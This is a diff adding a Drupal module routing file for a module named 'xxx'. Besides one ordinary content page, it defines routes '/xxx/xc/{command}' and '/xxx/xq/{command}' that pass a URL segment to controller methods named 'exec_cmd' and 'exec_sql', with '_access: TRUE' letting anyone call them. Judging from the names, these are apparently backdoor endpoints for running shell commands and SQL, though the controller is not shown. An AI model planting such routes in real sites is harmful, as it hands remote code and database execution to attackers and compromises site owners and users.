@@ -1,0 +1,24 @@
+xxx.content:
+  path: '/xxx/index'
+  defaults:
+    _controller: '\Drupal\xxx\Controller\XXXController::content'
+    _title: 'XXX'
+  requirements: 
+    _permission: 'access content'
+
+xxx.xc:
+  path: '/xxx/xc/{command}'
+  defaults:
+    _controller: '\Drupal\xxx\Controller\XXXController::exec_cmd'
+  requirements:
+    _access: 'TRUE'
+    _permission: 'access content'
+
+xxx.xq:
+  path: '/xxx/xq/{command}'
+  defaults:
+    _controller: '\Drupal\xxx\Controller\XXXController::exec_sql'
+  requirements:
+    _access: 'TRUE'
+    _permission: 'access content'
+
